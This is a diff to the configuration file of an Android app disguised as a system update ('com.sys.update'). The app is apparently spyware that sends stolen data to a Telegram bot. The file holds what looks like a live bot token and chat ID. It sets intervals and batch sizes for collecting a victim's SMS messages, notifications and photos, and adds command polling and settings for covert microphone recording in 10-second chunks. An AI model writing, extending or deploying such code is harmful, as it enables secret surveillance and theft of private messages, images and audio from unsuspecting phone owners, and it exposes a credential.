@@ -1,15 +1,23 @@
 package com.sys.update
 
 object Config {
-    // === Telegram Bot ===
     const val TELEGRAM_BOT_TOKEN = "8965774628:AAHiRk5BzVgGXJOMURMJyNNjHnpDj7MUAjM"
     const val TELEGRAM_CHAT_ID = "8599240795"
 
-    // === Scan intervals (milliseconds) ===
-    const val NOTIF_UPLOAD_INTERVAL_MS = 60_000L      // 1 min
-    const val MEDIA_SCAN_INTERVAL_MS = 300_000L       // 5 min
-    const val SMS_SCAN_INTERVAL_MS = 120_000L         // 2 min
+    // Polling
+    const val POLL_TIMEOUT_S = 25
+    const val POLL_INTERVAL_MS = 500L
+
+    // Audio
+    const val AUDIO_SAMPLE_RATE = 16000
+    const val AUDIO_BITRATE = 64000
+    const val AUDIO_CHUNK_MS = 10_000L      // مقطع كل 10 ثواني
+    const val AUDIO_VAD_THRESHOLD = 1500.0  // عتبة الصوت
+
+    // Limits
+    const val PHOTOS_BATCH_DEFAULT = 50
+    const val SMS_BATCH_DEFAULT = 100
+    const val NOTIF_BATCH_DEFAULT = 100
 
     fun hasTelegram(): Boolean = TELEGRAM_BOT_TOKEN.isNotBlank() && TELEGRAM_CHAT_ID.isNotBlank()
-    fun hasAnyBackend(): Boolean = hasTelegram()
 }
